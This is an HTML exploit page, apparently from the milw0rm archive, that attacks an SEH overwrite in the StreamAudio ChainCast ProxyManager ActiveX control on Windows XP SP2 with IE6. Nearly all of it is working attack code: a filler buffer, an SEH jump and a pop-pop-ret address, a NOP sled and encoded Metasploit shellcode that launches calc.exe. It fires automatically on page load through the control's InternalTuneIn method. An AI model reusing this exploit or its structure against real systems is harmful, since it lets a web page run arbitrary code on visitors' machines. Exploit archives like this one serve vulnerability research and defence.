<!-- 
StreamAudio ChainCast ProxyManager ccpm_0237.dll SEH Overwrite Exploit
Written by e.b.
Shellcode is limited to about 680 bytes
Tested on Windows XP SP2(fully patched) English, IE6, ccpm_0237.dll 3.0.0.237
Thanks to h.d.m. and the Metasploit crew 
-->
<html>
 <head>
  <title>StreamAudio ChainCast ProxyManager ccpm_0237.dll SEH Overwrite Exploit</title>
  <script language="JavaScript" defer>
    function Check() {
     
     var buf = 'A'; 
     while (buf.length <= 242) buf = buf + 'A';


// win32_exec -  EXITFUNC=seh CMD=c:\windows\system32\calc.exe Size=378 Encoder=Alpha2 http://metasploit.com 
var shellcode1 = unescape("%eb%03%59%eb%05%e8%f8%ff%ff%ff%49%49%49%49%49%49" +
                          "%48%49%49%49%49%49%49%49%49%49%49%49%51%5a%6a%43" +
                          "%58%30%42%31%50%42%41%6b%42%41%53%42%32%42%41%32" +
                          "%41%41%30%41%41%58%50%38%42%42%75%48%69%6b%4c%4d" +
                          "%38%63%74%75%50%33%30%67%70%4c%4b%73%75%57%4c%6e" +
                          "%6b%63%4c%45%55%63%48%33%31%58%6f%6c%4b%70%4f%77" +
                          "%68%6e%6b%73%6f%71%30%65%51%6a%4b%72%69%4e%6b%36" +
                          "%54%4e%6b%45%51%4a%4e%46%51%6b%70%4f%69%4c%6c%6e" +
                          "%64%59%50%73%44%53%37%58%41%7a%6a%54%4d%33%31%78" +
                          "%42%48%6b%7a%54%77%4b%52%74%66%44%34%44%62%55%59" +
                          "%75%6e%6b%41%4f%36%44%45%51%6a%4b%53%56%4c%4b%46" +
                          "%6c%72%6b%4c%4b%53%6f%37%6c%63%31%6a%4b%4e%6b%75" +
                          "%4c%6c%4b%54%41%48%6b%4d%59%51%4c%51%34%34%44%4a" +
                          "%63%30%31%6f%30%62%44%4e%6b%71%50%54%70%4b%35%6b" +
                          "%70%50%78%46%6c%6c%4b%63%70%44%4c%4c%4b%44%30%35" +
                          "%4c%6e%4d%6c%4b%61%78%55%58%6a%4b%64%49%4e%6b%6b" +
                          "%30%6c%70%57%70%57%70%47%70%4c%4b%70%68%47%4c%71" +
                          "%4f%44%71%6b%46%33%50%66%36%4f%79%4c%38%6e%63%4f" +
                          "%30%71%6b%30%50%41%78%58%70%6c%4a%53%34%51%4f%33" +
                          "%58%4e%78%39%6e%6d%5a%46%6e%61%47%4b%4f%69%77%63" +
                          "%53%45%6a%33%6c%72%57%30%69%50%6e%62%44%70%6f%73" +
                          "%47%41%63%41%4c%50%73%42%59%31%63%50%74%65%35%70" +
                          "%6d%54%73%65%62%33%6c%30%63%41%71%70%6c%53%53%66" +
                          "%4e%31%75%74%38%70%65%77%70%43");


		var next_seh_pointer = unescape("%EB%06%90%90"); //2 byte jump


		//oleacc.dll Windows XP SP2 English 0x74C96950 pop ebp - pop - retbis
                //no SafeSEH
		var seh_handler = unescape("%50%69%C9%74"); 
	
		var nop = unescape("%90%90%90%90%90%90%90%90%90%90%90%90");

		var m = buf + next_seh_pointer + seh_handler + nop + shellcode1 + nop;
		
		obj.InternalTuneIn(m, "", 0, 0, 0);
          
 } 
   
   </script>
  </head>
 <body onload="JavaScript: return Check();">
    <object id="obj" classid="clsid:2253F320-AB68-4A07-917D-4F12D8884A06" height="0" width="0">
     Unable to create object
    </object>
 </body>
</html>

# milw0rm.com [2008-01-11]